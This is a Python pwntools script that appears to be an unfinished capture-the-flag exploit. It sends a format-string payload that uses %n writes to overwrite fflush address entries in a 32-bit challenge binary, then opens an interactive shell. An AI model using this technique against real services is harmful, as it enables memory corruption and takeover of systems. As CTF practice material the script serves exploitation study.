#Import pwntools
from pwn import *

#Establish the target process, or network connection
target = process('./32_new')
#target = remote('163.172.176.29', 9035)

#Attach gdb if it is a process
gdb.attach(target)

#Print the first line of text
print target.recvline()

#Prompt for input, to pause for gdb
raw_input()

#Establish the addresses which we will be writing to
fflush_adr0 = p32(0x804a028)
fflush_adr1 = p32(0x804a029)
fflush_adr2 = p32(0x804a02b)

#Establish the necissary offputs for our input, so we can write to the addresses
fmt_string0 = "%10$n"
fmt_string1 = "%11$n"
fmt_string2 = "%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
